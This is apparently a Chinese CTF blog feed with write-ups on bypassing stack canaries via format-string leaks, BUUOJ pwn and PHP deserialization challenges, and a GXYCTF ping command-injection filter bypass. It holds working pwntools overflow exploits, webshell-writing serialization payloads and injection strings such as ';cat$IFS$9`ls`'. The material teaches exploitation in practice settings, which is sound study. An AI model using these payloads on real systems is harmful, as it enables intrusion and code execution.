        <content type="html"><![CDATA[<h3 id="0x-01-Canary保护原理及绕过"><a href="#0x-01-Canary保护原理及绕过" class="headerlink" title="0x 01 Canary保护原理及绕过"></a>0x 01 Canary保护原理及绕过</h3><p>canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致。通过泄露出canary进行绕过。</p><img src="/2020/03/20/Canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%AA%81%E7%A0%B4/image-20200119205446678.png" style="zoom:50%;"><h3 id="0x-02-例子分析"><a href="#0x-02-例子分析" class="headerlink" title="0x 02 例子分析"></a>0x 02 例子分析</h3><p>源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char str[0x20];</span><br><span class="line">    read(0,str,0x50);</span><br><span class="line">    printf(&quot;My name is %s.&quot;); &#x2F;&#x2F;printf期待下一个参数，而我们只传了一个参数，但是printf并不知道。会继续向高地址取四字节当成下一个参数</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编代码：（添加Canary保护编译结果）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0x0804849b &lt;+0&gt;:lea    ecx,[esp+0x4]    &#x2F;&#x2F;保护esp，地址中存储的返回地址数据没有变</span><br><span class="line">0x0804849f &lt;+4&gt;:and    esp,0xfffffff0   &#x2F;&#x2F;内存对齐</span><br><span class="line">0x080484a2 &lt;+7&gt;:push   DWORD PTR [ecx-0x4]  &#x2F;&#x2F;保护esp</span><br><span class="line">0x080484a5 &lt;+10&gt;:push   ebp</span><br><span class="line">0x080484a6 &lt;+11&gt;:mov    ebp,esp</span><br><span class="line">0x080484a8 &lt;+13&gt;:push   ecx</span><br><span class="line">0x080484a9 &lt;+14&gt;:sub    esp,0x34</span><br><span class="line">0x080484ac &lt;+17&gt;:mov    eax,gs:0x14   &#x2F;&#x2F;从gs:0x14的位置取出carry，复制给eax寄存器</span><br><span class="line">0x080484b2 &lt;+23&gt;:mov    DWORD PTR [ebp-0xc],eax   &#x2F;&#x2F;插入到ebp前面</span><br><span class="line">0x080484b5 &lt;+26&gt;:xor    eax,eax</span><br><span class="line">0x080484b7 &lt;+28&gt;:sub    esp,0x4</span><br><span class="line">0x080484ba &lt;+31&gt;:push   0x50</span><br><span class="line">0x080484bc &lt;+33&gt;:lea    eax,[ebp-0x2c]</span><br><span class="line">0x080484bf &lt;+36&gt;:push   eax</span><br><span class="line">0x080484c0 &lt;+37&gt;:push   0x0</span><br><span class="line">0x080484c2 &lt;+39&gt;:call   0x8048350 &lt;read@plt&gt;</span><br><span class="line">0x080484c7 &lt;+44&gt;:add    esp,0x10</span><br><span class="line">0x080484ca &lt;+47&gt;:sub    esp,0xc</span><br><span class="line">0x080484cd &lt;+50&gt;:push   0x8048580</span><br><span class="line">0x080484d2 &lt;+55&gt;:call   0x8048360 &lt;printf@plt&gt;</span><br><span class="line">0x080484d7 &lt;+60&gt;:add    esp,0x10</span><br><span class="line">0x080484da &lt;+63&gt;:mov    eax,0x0</span><br><span class="line">0x080484df &lt;+68&gt;:mov    edx,DWORD PTR [ebp-0xc]   &#x2F;&#x2F;取出carry与gs:0x14进行比较</span><br><span class="line">0x080484e2 &lt;+71&gt;:xor    edx,DWORD PTR gs:0x14</span><br><span class="line">0x080484e9 &lt;+78&gt;:je     0x80484f0 &lt;main+85&gt;</span><br><span class="line">0x080484eb &lt;+80&gt;:call   0x8048370 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">0x080484f0 &lt;+85&gt;:mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">0x080484f3 &lt;+88&gt;:leave  </span><br><span class="line">0x080484f4 &lt;+89&gt;:lea    esp,[ecx-0x4]</span><br><span class="line">0x080484f7 &lt;+92&gt;:ret</span><br></pre></td></tr></table></figure><p>常用输出格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure><p>这里需要注意一点，%s和%x的区别，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">     Stackframe</span><br><span class="line">+------------------+</span><br><span class="line">|   parameter1     |  &lt;- ESP  (pointer to &quot;%s&quot; or &quot;%x&quot;)</span><br><span class="line">+------------------+</span><br><span class="line">|   0xdeadbeef     |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>  当parameter1为%s的地址时，printf会将0xdeadbeef作为地址，取0xdeadbeef指向的字符串填入%s的位置并输出；当parameter1为%x的地址时，printf会直接将0xdeadbeef填入%x的位置，也就是直接输出0xdeadbeef。</p><ul><li>例子二</li></ul><p>源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void exploit()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">    char str[0x20];</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">    printf(str);</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，我们需要调试程序，让程序断在printf。查找canary距离printf第一个参数有多远，函数断在printf后栈中数据如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 0x28</span><br><span class="line">0000| 0xffffd620 --&gt; 0xffffd63c (&quot;aaa\n\377\377\377\377&#x2F;&quot;)</span><br><span class="line">0004| 0xffffd624 --&gt; 0xffffd63c (&quot;aaa\n\377\377\377\377&#x2F;&quot;)</span><br><span class="line">0008| 0xffffd628 --&gt; 0x50 (&#39;P&#39;)</span><br><span class="line">0012| 0xffffd62c --&gt; 0x804828a (&quot;__libc_start_main&quot;)</span><br><span class="line">0016| 0xffffd630 --&gt; 0x0 </span><br><span class="line">0020| 0xffffd634 --&gt; 0xffffd6d4 --&gt; 0xb21e8355 </span><br><span class="line">0024| 0xffffd638 --&gt; 0xf7fb5000 --&gt; 0x1b1db0 </span><br><span class="line">0028| 0xffffd63c (&quot;aaa\n\377\377\377\377&#x2F;&quot;)</span><br><span class="line">0032| 0xffffd640 --&gt; 0xffffffff </span><br><span class="line">0036| 0xffffd644 --&gt; 0x2f (&#39;&#x2F;&#39;)</span><br><span class="line">0040| 0xffffd648 --&gt; 0xf7e0fdc8 --&gt; 0x2b76 (&#39;v+&#39;)</span><br><span class="line">0044| 0xffffd64c --&gt; 0xf7fd31b0 --&gt; 0xf7e03000 --&gt; 0x464c457f </span><br><span class="line">0048| 0xffffd650 --&gt; 0x8000 </span><br><span class="line">0052| 0xffffd654 --&gt; 0xf7fb5000 --&gt; 0x1b1db0 </span><br><span class="line">0056| 0xffffd658 --&gt; 0xf7fb3244 --&gt; 0xf7e1b020 (&lt;_IO_check_libio&gt;:)</span><br><span class="line">0060| 0xffffd65c --&gt; 0xc4793000 </span><br><span class="line">0064| 0xffffd660 --&gt; 0x1 </span><br><span class="line">0068| 0xffffd664 --&gt; 0x1 </span><br><span class="line">0072| 0xffffd668 --&gt; 0xffffd688 --&gt; 0x0 </span><br><span class="line">0076| 0xffffd66c --&gt; 0x804857b (&lt;main+33&gt;:mov    eax,0x0)</span><br><span class="line">0080| 0xffffd670 --&gt; 0x1 </span><br><span class="line">0084| 0xffffd674 --&gt; 0xffffd734 --&gt; 0xffffd86b (&quot;&#x2F;home&#x2F;hw&#x2F;桌面&#x2F;PWN&#x2F;02&quot;)</span><br><span class="line">0088| 0xffffd678 --&gt; 0xffffd73c --&gt; 0xffffd882 (&quot;TERM&#x3D;xterm-256color&quot;)</span><br><span class="line">0092| 0xffffd67c --&gt; 0xc4793000 </span><br><span class="line">0096| 0xffffd680 --&gt; 0xf7fb53dc --&gt; 0xf7fb61e0 --&gt; 0x0</span><br></pre></td></tr></table></figure><p>打印输出一下carry的信息的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p $ebp-0xc</span><br><span class="line">$2 &#x3D; (void *) 0xffffd65c</span><br></pre></td></tr></table></figure><p>距离第一个参数有60字节，也就是15个参数的长度，所以要读canary我们的payload为%15x。</p><blockquote><p><strong>1.任意地址读：</strong></p><p>根据先前的知识，我们只需要把最后一个%08x换成%s就可以读取0x61616161地址的数据，注意这个0x61616161是我们可以控制的内容，就是我们输入的前四个字节且这四个字节就是读取的地址。所以，可以通过替换这个payload的前四个字节完成任意地址读。</p><p>这个payload也可以简化为aaaa%7$s，这里的7$的意思就是取printf的第七个参数(0x61616161)，如果这里要用等宽输出的话payload就变成这样了aaaa%7$08x，结果会输出aaaa61616161。</p><p><strong>2.任意地址写：</strong></p><p>我们先了解一下%n的作用。%n是将输出的字符的个数写入到内存中。</p><p>根据上述知识，当payload为aaaa%7$n时，输出的字符数量为4，程序会将4写入0x61616161指向的内存中。如果我们需要写更大的数就得用等宽输出来实现了。假设，我们需要向0x61616161写入100，则payload就变成了aaaa%7$0100n。</p><p>任意地址写还有一个问题就是，如果我们要写一个很大的数，比如要将0x8048320写入0x61616161，这个16进制对应的十进制数为134513440，也就是说需要在输出134513440个字符。不用多想，程序肯定会崩溃。</p><p>如果遇到这种情况怎么办呢？我们可以通过%hn来两字节两字节写入。在上面的例子中，我们将0x8048320拆分为高两字节0x804和低两字节0x8320，将0x804也就是十进制2052写入0x61616161 – 0x61616162；将0x8320也就是十进制33568写入0x61616163 –  0x61616164。分两次写入就可以完成大数的写入了。</p><p>参考：<a href="https://www.anquanke.com/post/id/85203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85203</a></p></blockquote><p>泄露carry数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@hw-virtual-machine:&#x2F;home&#x2F;hw&#x2F;桌面&#x2F;PWN# .&#x2F;02</span><br><span class="line">%15$08x</span><br><span class="line">cdb3e300</span><br></pre></td></tr></table></figure><p>分析：0xffffd63c地址是第一个参数数据的实际地址，0xffffd65c是carry的地址，偏移量是32字节，0xffffd668是函数的返回地址，偏移量是12个字节</p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;c&quot;)</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;c&quot;)</span><br><span class="line">shell_addr &#x3D; elf.symbols[&quot;exploit&quot;]</span><br><span class="line">payload &#x3D; &quot;%15$08x&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">ret &#x3D; p.recv()</span><br><span class="line">canary &#x3D; ret[:8]</span><br><span class="line">print canary</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 32</span><br><span class="line">payload +&#x3D; (canary.decode(&quot;hex&quot;))[::-1]   # 小端模式反转</span><br><span class="line">payload +&#x3D; &#39;a&#39; * 12</span><br><span class="line">payload +&#x3D; p32(shell_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>参考资料：<a href="https://blog.csdn.net/ddllrrbb/article/details/88854492" target="_blank" rel="noopener">大小端的判断及转换</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> pwn基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Canary保护 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuoj新春WEB红包题</title>
      <link href="/2020/03/20/buuoj%E6%96%B0%E6%98%A5WEB%E7%BA%A2%E5%8C%85%E9%A2%98/"/>
      <url>/2020/03/20/buuoj%E6%96%B0%E6%98%A5WEB%E7%BA%A2%E5%8C%85%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-题目分析"><a href="#0x-01-题目分析" class="headerlink" title="0x 01 题目分析"></a>0x 01 题目分析</h3><p>题目改编自 EIS 2019 的 ezpop，与原题不同的是加了下面这个，对文件名有所控制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function getCacheKey(string $name): string &#123;</span><br><span class="line">        &#x2F;&#x2F; 使缓存文件名随机</span><br><span class="line">        $cache_filename &#x3D; $this-&gt;options[&#39;prefix&#39;] . uniqid() . $name;</span><br><span class="line">        if(substr($cache_filename, -strlen(&#39;.php&#39;)) &#x3D;&#x3D;&#x3D; &#39;.php&#39;) &#123;</span><br><span class="line">            die(&#39;?&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        return $cache_filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原题解题报告参考：<a href="https://www.jianshu.com/p/763427ea0e4b" target="_blank" rel="noopener">https://www.jianshu.com/p/763427ea0e4b</a></p><h3 id="0x-02-解题方法一"><a href="#0x-02-解题方法一" class="headerlink" title="0x 02 解题方法一"></a>0x 02 解题方法一</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$testB &#x3D; new B();</span><br><span class="line">$testB-&gt;options[&#39;prefix&#39;] &#x3D; &#39;abc&#39;;</span><br><span class="line">$testB-&gt;options[&#39;serialize&#39;] &#x3D; &#39;system&#39;;</span><br><span class="line">$testB-&gt;options[&#39;data_compress&#39;] &#x3D; false;</span><br><span class="line">$testB-&gt;options[&#39;expire&#39;] &#x3D; &quot;aaa\n&quot;;</span><br><span class="line">$testB-&gt;writeTimes &#x3D; 0;</span><br><span class="line">$testA &#x3D; new A($testB, &quot;miao&quot;);</span><br><span class="line">$testA-&gt;autosave &#x3D; false;</span><br><span class="line">$testA-&gt;cache &#x3D; [&#39;aaq&#39; &#x3D;&gt; &#39;&#96;cat &#x2F;flag &gt; .&#x2F;flag.php&#96;&#39;];</span><br><span class="line">$testA-&gt;complete &#x3D; true;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($testA)).&quot;\n&quot;;</span><br></pre></td></tr></table></figure><p>这里<code>$serizlize</code> 是可控的，<code>$data</code> 会被转换成json,利用system执行命令，最后相当于执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;[&#123;&quot;aaq&quot;:&quot;&#96;cat \&#x2F;flag &gt; .\&#x2F;flag.php&#96;&quot;&#125;,true]&quot;</span><br></pre></td></tr></table></figure><p>在shell里面，的优先级是高于”的，所以会先执行<code>cat /flag &gt; ./flag.php</code>然后再将执行结果拼接成一个新的命令,参考 <a href="https://www.anquanke.com/post/id/194036" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194036</a></p><h3 id="0x-03-解题方法二"><a href="#0x-03-解题方法二" class="headerlink" title="0x 03 解题方法二"></a>0x 03 解题方法二</h3><p>对于前面的随机值，使用/../即可截断，后面即可追加写任意文件。</p><p>于是先写一个 .user.ini，然后写一个 .jpg 里面带马，使其追加到其他 php 后面作为 php 执行即可。</p><p>参见 <a href="http://althims.com/2020/01/29/buu-new-year/" target="_blank" rel="noopener">http://althims.com/2020/01/29/buu-new-year/</a></p><h3 id="0x-04-解题方法三"><a href="#0x-04-解题方法三" class="headerlink" title="0x 04 解题方法三"></a>0x 04 解题方法三</h3><p>对于尾部 .php 的限制，可使用追加 /. 来绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$testB &#x3D; new B();</span><br><span class="line">$testA &#x3D; new A($testB, $key &#x3D; &#39;&#x2F;..&#x2F;miao1.php&#x2F;.&#39;);</span><br><span class="line">$testA-&gt;complete &#x3D; true;</span><br><span class="line">$testA-&gt;autosave &#x3D; false;</span><br><span class="line">&#x2F;&#x2F; &lt;?php phpinfo();?\&gt;</span><br><span class="line">$testA-&gt;cache &#x3D; array(&quot;PD9waHAgcGhwaW5mbygpOz8+&quot;&#x3D;&gt;&quot;&quot;);</span><br><span class="line">$testB-&gt;options[&#39;prefix&#39;] &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags|convert.base64-decode&#x2F;resource&#x3D;&#39;;</span><br><span class="line">$testB-&gt;options[&#39;serialize&#39;] &#x3D; &#39;strval&#39;;</span><br><span class="line">$testB-&gt;options[&#39;data_compress&#39;] &#x3D; false;</span><br><span class="line">$testB-&gt;options[&#39;expire&#39;] &#x3D; &quot;aaa\n&quot;;</span><br><span class="line">$testB-&gt;writeTimes &#x3D; 0;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($testA)).&quot;\n&quot;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ-pwn题解（一）</title>
      <link href="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-rip"><a href="#0x-01-rip" class="headerlink" title="0x 01 rip"></a>0x 01 rip</h3><p>存在后门函数fun，覆盖返回地址为fun地址</p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29406)</span><br><span class="line">payload&#x3D;&#39;a&#39;*23+p64(0x401186)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x-02-warmup-csaw-2016"><a href="#0x-02-warmup-csaw-2016" class="headerlink" title="0x 02 warmup_csaw_2016"></a>0x 02 warmup_csaw_2016</h3><p>存在后门函数</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122111550543.png" alt></p><p>首先我们用cyclic创建一个200字符的字符串，利用它来判断溢出点到返回地址的偏移</p><p>启动dbg进行调试</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122112113113.png" alt></p><p>由图可得，根据小端序，‘saaa‘之前有多少个字符，就是偏移量</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122112201127.png" alt></p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p&#x3D;remote(&#39;node3.buuoj.cn&#39;,25478)</span><br><span class="line">addr&#x3D;0x40060d</span><br><span class="line">payload&#x3D;&#39;a&#39;*72+p64(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x-03-pwn1-sctf-2016"><a href="#0x-03-pwn1-sctf-2016" class="headerlink" title="0x 03 pwn1_sctf_2016"></a>0x 03 pwn1_sctf_2016</h3><p>在输入点中可以输入32个字节的数据到0x3c空间，不存在溢出问题。</p><p>接着出现了字符串you、字符串I和replace函数，初步猜测是发生了替换操作，执行验证</p><p>替换过程为I=you,一个字节产生三个字节。</p><p>在替换完成后，使用了strcpy函数将替换后的数据拷贝到s中。这里可以构造溢出点。</p><p>通过输入21个I，然后替换成21个you，一共63个字节数据，然后任意填入一个字节数据，接着就填充满溢出空间，然后再劫持控制流EIP到利用点函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28850)</span><br><span class="line">flag_addr &#x3D; 0x08048f0d</span><br><span class="line">payload &#x3D; &#39;I&#39;*((0x3c+4-1)&#x2F;3)+&#39;R&#39;+p32(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h3 id="0x-04-ciscn-2019-n-1"><a href="#0x-04-ciscn-2019-n-1" class="headerlink" title="0x 04 ciscn_2019_n_1"></a>0x 04 ciscn_2019_n_1</h3><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122145436538.png" alt></p><p>就是一个简单的溢出让v2变成11.28125。v1是var_30，v2是var_4：</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122145537195.png" alt></p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122145607698.png" alt></p><p>再看一下11.28125在程序中的表示：</p><p><img src="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/image-20200122145944155.png" alt></p><p>也就是让v2变成41348000h，所以exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">29263</span>)</span><br><span class="line">payload = <span class="string">'1'</span> * <span class="number">0x2c</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x-05"><a href="#0x-05" class="headerlink" title="0x 05"></a>0x 05</h3>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019复盘</title>
      <link href="/2020/03/20/GXYCTF2019%E5%A4%8D%E7%9B%98/"/>
      <url>/2020/03/20/GXYCTF2019%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x-01-Ping-Ping-Ping"><a href="#0x-01-Ping-Ping-Ping" class="headerlink" title="0x 01 Ping Ping Ping"></a>0x 01 Ping Ping Ping</h3><ul><li>解题思路</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;ip&#39;]))&#123;</span><br><span class="line">  $ip &#x3D; $_GET[&#39;ip&#39;];</span><br><span class="line">  if(preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个题目首先过滤了符号，但是过滤不严格，可以使用管道符和;，因此可以使用这两个符号来拼</p><p>接命令；其次过滤了空格，可以使用$IFS$9来替代空格；最后过滤了flflag，这个过滤比较严格，具</p><p>体的正则是 .<em>f.<em>l.</em>a.*g.</em> ，可以通过 base64 来绕过，或者用变量名拼接绕过。</p><p>解法一：利用反引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>解法二：利用base64绕过 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 